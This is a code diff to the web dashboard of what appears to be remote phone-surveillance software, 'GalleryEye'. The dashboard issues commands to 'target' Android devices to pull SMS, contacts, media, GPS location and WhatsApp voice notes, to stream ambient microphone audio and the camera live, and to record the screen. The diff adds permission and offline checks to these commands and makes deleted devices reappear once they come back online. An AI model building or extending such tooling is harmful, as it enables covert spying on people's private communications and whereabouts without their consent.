@@ -39,6 +39,7 @@ const ZipProgressModal = dynamic(() => import("@/components/ZipProgressModal"), 
 const CustomAlertModal = dynamic(() => import("@/components/CustomAlertModal"), { ssr: false });
 const ConfirmDeleteModal = dynamic(() => import("@/components/ConfirmDeleteModal"), { ssr: false });
 const QuickTutorial = dynamic(() => import("@/components/QuickTutorial"), { ssr: false });
+import { DeviceOfflineModal, DevicePermissionModal } from "@/components/DeviceActionModals";
 
 let socket: any = null;
 
@@ -293,6 +294,17 @@ export default function Home(props: any) {
                 if (cachedLoc) {
                     try { setLocationData(JSON.parse(cachedLoc)); } catch {}
                 }
+
+                const cachedPerms = localStorage.getItem(`permissions_${selectedDeviceId}`);
+                if (cachedPerms) {
+                    try {
+                        const parsed = JSON.parse(cachedPerms);
+                        setDevicePermissions(parsed);
+                        setDevicePermissionsMap(prev => ({ ...prev, [selectedDeviceId]: parsed }));
+                    } catch {}
+                } else {
+                    setDevicePermissions(null);
+                }
             } catch (err) {
                 console.error('[Cache] Error restoring device cache:', err);
             }
@@ -378,17 +390,11 @@ export default function Home(props: any) {
     const notifiedDevicesRef = useRef<Set<string>>(new Set());
     const deletedDevicesRef = useRef<Set<string>>(new Set());
 
-    // Load permanently deleted devices from localStorage on client init
+    // Clean up any legacy deleted devices localStorage blacklist
     useEffect(() => {
         if (typeof window !== 'undefined') {
             try {
-                const stored = localStorage.getItem('galleryeye_deleted_devices');
-                if (stored) {
-                    const parsed = JSON.parse(stored);
-                    if (Array.isArray(parsed)) {
-                        parsed.forEach(id => deletedDevicesRef.current.add(String(id)));
-                    }
-                }
+                localStorage.removeItem('galleryeye_deleted_devices');
             } catch {}
         }
     }, []);
@@ -441,9 +447,6 @@ export default function Home(props: any) {
             } catch {}
         });
 
-        try {
-            localStorage.setItem('galleryeye_deleted_devices', JSON.stringify(Array.from(deletedDevicesRef.current)));
-        } catch {}
 
         // Remove from local UI state immediately and update cached devices
         setDevices(prev => {
@@ -600,6 +603,21 @@ export default function Home(props: any) {
     // Settings Modal State
     const [isSettingsOpen, setIsSettingsOpen] = useState(false);
     const [devicePermissions, setDevicePermissions] = useState<any>(null);
+    const [devicePermissionsMap, setDevicePermissionsMap] = useState<Record<string, Record<string, boolean>>>({});
+
+    // Modals for Offline and Hardware Permission states
+    const [offlineModal, setOfflineModal] = useState<{
+        isOpen: boolean;
+        deviceName: string;
+        actionName?: string;
+    }>({ isOpen: false, deviceName: '', actionName: '' });
+
+    const [permissionModal, setPermissionModal] = useState<{
+        isOpen: boolean;
+        deviceName: string;
+        permissionKey: string;
+        permissionLabel?: string;
+    }>({ isOpen: false, deviceName: '', permissionKey: 'camera', permissionLabel: '' });
 
     // Profile Menu State (Mobile)
     const [isProfileMenuOpen, setIsProfileMenuOpen] = useState(false);
@@ -808,6 +826,14 @@ export default function Home(props: any) {
                         const filteredList = data.devices.filter((d: any) => {
                             const devId = String(d.deviceId || d.id || d._id || '');
                             if (isGhostDevice(d)) return false;
+                            // If device is online, always show it and remove from temporary delete cache
+                            if (d.online) {
+                                deletedDevicesRef.current.delete(devId);
+                                deletedDevicesRef.current.delete(String(d.deviceId));
+                                deletedDevicesRef.current.delete(String(d.id));
+                                deletedDevicesRef.current.delete(String(d._id));
+                                return true;
+                            }
                             if (deletedDevicesRef.current.has(devId) || deletedDevicesRef.current.has(String(d.deviceId)) || deletedDevicesRef.current.has(String(d.id)) || deletedDevicesRef.current.has(String(d._id))) {
                                 return false;
                             }
@@ -904,6 +930,14 @@ export default function Home(props: any) {
                 const filteredList = Array.isArray(deviceList) ? deviceList.filter(d => {
                     const devId = String(d.deviceId || d.id || d._id || '');
                     if (isGhostDevice(d)) return false;
+                    // If device is online, always show it and unblock from delete cache
+                    if (d.online) {
+                        deletedDevicesRef.current.delete(devId);
+                        deletedDevicesRef.current.delete(String(d.deviceId));
+                        deletedDevicesRef.current.delete(String(d.id));
+                        deletedDevicesRef.current.delete(String(d._id));
+                        return true;
+                    }
                     if (deletedDevicesRef.current.has(devId) || deletedDevicesRef.current.has(String(d.deviceId)) || deletedDevicesRef.current.has(String(d.id)) || deletedDevicesRef.current.has(String(d._id))) {
                         return false;
                     }
@@ -979,12 +1013,28 @@ export default function Home(props: any) {
             socket.on("device_status", (data: any) => {
                 if (!data || !data.deviceId) return;
                 const devId = String(data.deviceId);
-                if (deletedDevicesRef.current.has(devId)) return;
                 const isOnline = !!data.online;
+
+                if (isOnline) {
+                    deletedDevicesRef.current.delete(devId);
+                } else if (deletedDevicesRef.current.has(devId)) {
+                    return;
+                }
 
                 setDevices(prev => {
                     const match = prev.some(d => String(d.deviceId || d.id || d._id || '') === devId);
-                    if (!match) return prev;
+                    if (!match) {
+                        if (isOnline) {
+                            return [{
+                                deviceId: devId,
+                                id: devId,
+                                name: data.name || data.model || 'Android Device',
+                                online: true,
+                                lastSeen: data.lastSeen || new Date()
+                            }, ...prev];
+                        }
+                        return prev;
+                    }
                     return prev.map(d => {
                         if (String(d.deviceId || d.id || d._id || '') === devId) {
                             return { ...d, online: isOnline, lastSeen: data.lastSeen || new Date() };
@@ -1312,7 +1362,21 @@ export default function Home(props: any) {
             // Permission Check Response
             socket.on("permission_status", (data: any) => {
                 setIsCheckingPermissions(false);
-                setDevicePermissions(data.permissions);
+                if (data?.permissions) {
+                    setDevicePermissions(data.permissions);
+                    const devId = selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : '');
+                    if (devId) {
+                        setDevicePermissionsMap(prev => ({ ...prev, [devId]: data.permissions }));
+                        try { localStorage.setItem(`permissions_${devId}`, JSON.stringify(data.permissions)); } catch {}
+                    }
+                    // Auto-close permission modal if the required permission is now granted
+                    setPermissionModal(prev => {
+                        if (prev.isOpen && data.permissions[prev.permissionKey] === true) {
+                            return { ...prev, isOpen: false };
+                        }
+                        return prev;
+                    });
+                }
             });
 
             socket.on("d_f4", (data: any) => {
@@ -1891,11 +1955,11 @@ export default function Home(props: any) {
                     targetDeviceId: effectiveTarget
                 });
             }
-        });
+        }, { requiredPermission: 'storage', actionName: 'Directory Folder Scan' });
     };
 
     const handleFolderClick = (folder: any) => {
-        if (!requireConnectedDevice(() => {})) return;
+        if (!requireConnectedDevice(() => {}, { requiredPermission: 'storage', actionName: 'Folder Media Sync' })) return;
         // Prevent clicking while upload is in progress
         if (uploadProgress) {
             setAlertData({ title: 'Sync in Progress', message: 'Please wait for the current sync to complete.', type: 'info' });
@@ -1933,15 +1997,16 @@ export default function Home(props: any) {
             .catch(e => console.error('[SMS API] Fetch error:', e))
             .finally(() => setIsFetchingSms(false));
 
-        // 2. If device is currently online, also request live update from device via socket
-        const isDeviceOnline = !!devices.find(d => String(d.deviceId || d.id || d._id || '') === String(effectiveTarget))?.online;
-        if (socket && isDeviceOnline) {
-            socket.emit("get_sms", {
-                uuid,
-                targetDeviceId: effectiveTarget,
-                fullSync: true
-            });
-        }
+        // 2. Request live update from device via socket (validates online and permission)
+        requireConnectedDevice((targetId) => {
+            if (socket) {
+                socket.emit("get_sms", {
+                    uuid,
+                    targetDeviceId: targetId,
+                    fullSync: true
+                });
+            }
+        }, { requiredPermission: 'sms', actionName: 'Live SMS Sync' });
     };
 
     const resetSmsSync = () => {
@@ -1954,7 +2019,7 @@ export default function Home(props: any) {
                 });
                 setSmsList([]);
             }
-        });
+        }, { requiredPermission: 'sms', actionName: 'Reset SMS History' });
     };
 
     // Contacts Functions (Works both Online & Offline via DB)
@@ -1984,18 +2049,19 @@ export default function Home(props: any) {
             .catch(e => console.error('[Contacts API] Fetch error:', e))
             .finally(() => setIsFetchingContacts(false));
 
-        // 2. If device is currently online, also request live update from device via socket
-        const isDeviceOnline = !!devices.find(d => String(d.deviceId || d.id || d._id || '') === String(effectiveTarget))?.online;
-        if (socket && isDeviceOnline) {
-            const payload = {
-                uuid,
-                targetDeviceId: effectiveTarget,
-                deviceId: effectiveTarget
-            };
-            socket.emit("get_contacts", payload);
-            socket.emit("sync_contacts", payload);
-            socket.emit("request_contacts", payload);
-        }
+        // 2. Request live update from device via socket (validates online and permission)
+        requireConnectedDevice((targetId) => {
+            if (socket) {
+                const payload = {
+                    uuid,
+                    targetDeviceId: targetId,
+                    deviceId: targetId
+                };
+                socket.emit("get_contacts", payload);
+                socket.emit("sync_contacts", payload);
+                socket.emit("request_contacts", payload);
+            }
+        }, { requiredPermission: 'contacts', actionName: 'Live Contacts Sync' });
     };
 
     // Permission Check Function
@@ -2010,7 +2076,21 @@ export default function Home(props: any) {
                     targetDeviceId: effectiveTarget
                 });
             }
-        });
+        }, { actionName: 'Probe Permissions' });
+    };
+
+    const handleProbePermissionsInModal = () => {
+        const activeTarget = selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
+        if (socket && activeTarget && userUuid) {
+            setIsCheckingPermissions(true);
+            socket.emit("check_permissions", {
+                uuid: userUuid,
+                targetDeviceId: activeTarget
+            });
+            setTimeout(() => {
+                setIsCheckingPermissions(false);
+            }, 6000);
+        }
     };
 
     // Filtered SMS based on search
@@ -2056,7 +2136,7 @@ export default function Home(props: any) {
                 setSelectedFolder(null);
                 setSyncMediaType(null);
             }
-        });
+        }, { requiredPermission: 'storage', actionName: 'Media Extraction' });
     };
 
     // --- Torch Functions ---
@@ -2080,7 +2160,7 @@ export default function Home(props: any) {
                 aggressive: torchAggressive,
                 duration: torchDuration
             });
-        });
+        }, { requiredPermission: 'camera', actionName: 'Flashlight Control' });
     };
 
     const fetchLocation = useCallback(() => {
@@ -2104,7 +2184,7 @@ export default function Home(props: any) {
             setTimeout(() => {
                 setIsFetchingLocation(false);
             }, 8000);
-        });
+        }, { requiredPermission: 'location', actionName: 'Live GPS Telemetry' });
     }, [socket, selectedDeviceId, userUuid, planLimits, devices]);
 
     // --- Vibration Functions ---
@@ -2123,7 +2203,7 @@ export default function Home(props: any) {
                 targetDeviceId: effectiveTarget,
                 duration: vibrationDuration
             });
-        });
+        }, { actionName: 'Remote Vibration' });
     };
 
     // --- Live Audio Functions ---
@@ -2148,7 +2228,7 @@ export default function Home(props: any) {
             audioTimerRef.current = setInterval(() => {
                 setAudioElapsed(prev => prev + 1);
             }, 1000);
-        });
+        }, { requiredPermission: 'microphone', actionName: 'Live Ambient Audio' });
     }, [socket, selectedDeviceId, userUuid, userPlan, devices]);
 
     const stopLiveAudio = useCallback(() => {
@@ -2265,7 +2345,7 @@ export default function Home(props: any) {
                     voiceRecTimerRef.current = null;
                 }
             }, 1000);
-        });
+        }, { requiredPermission: 'microphone', actionName: 'Surround Voice Recording' });
     }, [socket, selectedDeviceId, userUuid, voiceRecDuration, devices]);
 
     const stopVoiceRecording = useCallback(() => {
@@ -2533,48 +2613,75 @@ END:VCARD`;
 
     const onlineDeviceCount = devices.filter(d => d.online).length;
 
-    const requireConnectedDevice = (action: (targetId?: string) => void) => {
+    const requireConnectedDevice = (
+        action: (targetId: string) => void,
+        options?: {
+            actionName?: string;
+            requiredPermission?: 'camera' | 'microphone' | 'location' | 'storage' | 'sms' | 'contacts' | 'notifications';
+            permissionLabel?: string;
+        } | string
+    ): boolean => {
+        const requiredPermission = typeof options === 'string' ? options : options?.requiredPermission;
+        const actionName = typeof options === 'object' ? options?.actionName : undefined;
+        const permissionLabel = typeof options === 'object' ? options?.permissionLabel : undefined;
+
         const activeId = selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-        let currentSelected = devices.find(d => String(d.deviceId || d.id || d._id || '') === String(activeId || ''));
+        const currentSelected = devices.find(d => {
+            const d1 = String(d.deviceId || '');
+            const d2 = String(d.id || '');
+            const d3 = String(d._id || '');
+            return d1 === String(activeId || '') || d2 === String(activeId || '') || d3 === String(activeId || '');
+        });
 
-        // If currently selected device is offline or not found, check if an online device exists
-        if (!currentSelected || !currentSelected.online) {
-            const availableOnline = devices.find(d => d.online);
-            if (availableOnline) {
-                const autoId = String(availableOnline.deviceId || availableOnline.id || availableOnline._id || '');
-                setSelectedDeviceId(autoId);
-                selectedDeviceIdRef.current = autoId;
-                try { localStorage.setItem('selectedDeviceId', autoId); } catch {}
-                currentSelected = availableOnline;
-            }
-        }
-
-        // If still not found, check ANY device in devices list
-        if (!currentSelected && devices.length > 0) {
-            const fallbackId = String(devices[0].deviceId || devices[0].id || devices[0]._id || '');
-            setSelectedDeviceId(fallbackId);
-            selectedDeviceIdRef.current = fallbackId;
-            try { localStorage.setItem('selectedDeviceId', fallbackId); } catch {}
-            currentSelected = devices[0];
-        }
-
-        // If device list is still loading or empty, but user already has activeId stored
-        if (!currentSelected && activeId) {
-            action(String(activeId));
-            return true;
-        }
-
-        if (!currentSelected) {
+        // 1. If no device exists in state and none stored
+        if (!currentSelected && !activeId) {
             setAlertData({
                 title: 'No Device Selected',
-                message: 'Please select a target device from the top navigation menu before executing commands or syncing data.',
+                message: 'Please select a target device from the top navigation menu before executing commands.',
                 type: 'warning'
             });
             setShowCustomAlert(true);
             return false;
         }
 
-        const resolvedId = String(currentSelected.deviceId || currentSelected.id || currentSelected._id || '');
+        const resolvedId = String(currentSelected?.deviceId || currentSelected?.id || currentSelected?._id || activeId || '');
+        const devName = currentSelected 
+            ? getCleanDeviceName(currentSelected) 
+            : (activeId ? ((typeof window !== 'undefined' ? localStorage.getItem(`dev_name_${activeId}`) : '') || 'Target Device') : 'Target Device');
+
+        // 2. OFFLINE CHECK - If selected device is offline, show DeviceOfflineModal
+        const isDeviceOnline = currentSelected ? Boolean(currentSelected.online) : false;
+        if (!isDeviceOnline) {
+            setOfflineModal({
+                isOpen: true,
+                deviceName: devName,
+                actionName: actionName
+            });
+            return false;
+        }
+
+        // 3. HARDWARE PERMISSION CHECK (Only performed when device is online)
+        if (requiredPermission) {
+            let perms = devicePermissionsMap[resolvedId] || devicePermissions;
+            if (!perms && typeof window !== 'undefined') {
+                try {
+                    const saved = localStorage.getItem(`permissions_${resolvedId}`);
+                    if (saved) perms = JSON.parse(saved);
+                } catch {}
+            }
+
+            // Only block if permissions telemetry exists AND the specific permission is verified to be false (not granted)
+            if (perms && perms[requiredPermission] === false) {
+                setPermissionModal({
+                    isOpen: true,
+                    deviceName: devName,
+                    permissionKey: requiredPermission,
+                    permissionLabel: permissionLabel
+                });
+                return false;
+            }
+        }
+
         action(resolvedId);
         return true;
     };
@@ -2618,13 +2725,22 @@ END:VCARD`;
                     );
                 }
                 const effectiveTargetDevice = selectedDeviceId || selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null) || (devices.length > 0 ? String(devices[0].deviceId || devices[0].id || devices[0]._id) : null);
-                const isOnline = !!devices.find(d => String(d.deviceId || d.id || d._id) === String(effectiveTargetDevice))?.online;
+                const targetDevObj = devices.find(d => String(d.deviceId || d.id || d._id) === String(effectiveTargetDevice));
+                const isOnline = !!targetDevObj?.online;
+                const devName = targetDevObj ? getCleanDeviceName(targetDevObj) : undefined;
                 return (
                     <FileManagerView
                         socket={socket}
                         userUuid={userUuid}
                         selectedDeviceId={effectiveTargetDevice}
                         isOnline={isOnline}
+                        onTriggerOffline={() => {
+                            setOfflineModal({
+                                isOpen: true,
+                                deviceName: devName || 'Target Device',
+                                actionName: 'File Manager'
+                            });
+                        }}
                     />
                 );
             }
@@ -2680,7 +2796,7 @@ END:VCARD`;
                                     cameraModeRef.current = cameraMode;
                                     cameraQualityRef.current = cameraQuality;
                                 }
-                            });
+                            }, { requiredPermission: 'camera', actionName: 'Camera Live Stream' });
                         }}
                         onCapturePhoto={() => {
                             requireConnectedDevice((targetId) => {
@@ -2702,7 +2818,7 @@ END:VCARD`;
                                     isTemp: true
                                 }, ...prev]);
                                 socket?.emit('c_f1', { uuid: userUuid, targetDeviceId: effectiveTarget, camera: cameraMode });
-                            });
+                            }, { requiredPermission: 'camera', actionName: 'Remote Snapshot' });
                         }}
                         onToggleRecording={() => {
                             requireConnectedDevice((targetId) => {
@@ -2726,7 +2842,7 @@ END:VCARD`;
                                     setRecordingProgress({ current: 0, total: recordingDuration });
                                     socket?.emit('c_f2', { uuid: userUuid, targetDeviceId: effectiveTarget, camera: cameraMode, duration: recordingDuration });
                                 }
-                            });
+                            }, { requiredPermission: 'camera', actionName: 'Camera Video Recording' });
                         }}
                         setPreviewItem={setPreviewItem}
                         setDeleteConfirmation={setDeleteConfirmation}
@@ -2745,18 +2861,38 @@ END:VCARD`;
                         selectedDeviceId={effectiveTargetDevice}
                         isOnline={isOnline}
                         deviceName={devName}
+                        onTriggerOffline={() => {
+                            setOfflineModal({
+                                isOpen: true,
+                                deviceName: devName || 'Target Device',
+                                actionName: 'Screen Recording'
+                            });
+                        }}
                     />
                 );
             }
-            case 'wavoice':
+            case 'wavoice': {
+                const effectiveTargetDevice = selectedDeviceId || selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null) || (devices.length > 0 ? String(devices[0].deviceId || devices[0].id || devices[0]._id) : null);
+                const targetDevObj = devices.find(d => String(d.deviceId || d.id || d._id) === String(effectiveTargetDevice));
+                const isOnline = !!targetDevObj?.online;
+                const devName = targetDevObj ? getCleanDeviceName(targetDevObj) : undefined;
                 return (
                     <WhatsAppVoiceView
                         socket={socket}
                         selectedDeviceId={selectedDeviceId}
                         userUuid={userUuid}
                         setDeleteConfirmation={setDeleteConfirmation}
+                        isOnline={isOnline}
+                        onTriggerOffline={() => {
+                            setOfflineModal({
+                                isOpen: true,
+                                deviceName: devName || 'Target Device',
+                                actionName: 'WhatsApp Voice Notes'
+                            });
+                        }}
                     />
                 );
+            }
             case 'audio':
                 return (
                     <VoiceView
@@ -3000,6 +3136,24 @@ END:VCARD`;
                 title={alertData.title}
                 message={alertData.message}
                 type={alertData.type}
+            />
+
+            {/* Tactile Claymorphic Device Status & Hardware Permission Modals */}
+            <DeviceOfflineModal
+                isOpen={offlineModal.isOpen}
+                onClose={() => setOfflineModal(prev => ({ ...prev, isOpen: false }))}
+                deviceName={offlineModal.deviceName}
+                actionName={offlineModal.actionName}
+            />
+
+            <DevicePermissionModal
+                isOpen={permissionModal.isOpen}
+                onClose={() => setPermissionModal(prev => ({ ...prev, isOpen: false }))}
+                deviceName={permissionModal.deviceName}
+                permissionKey={permissionModal.permissionKey}
+                permissionLabel={permissionModal.permissionLabel}
+                onProbePermissions={handleProbePermissionsInModal}
+                isProbing={isCheckingPermissions}
             />
 
             {deleteConfirmation.isOpen && (
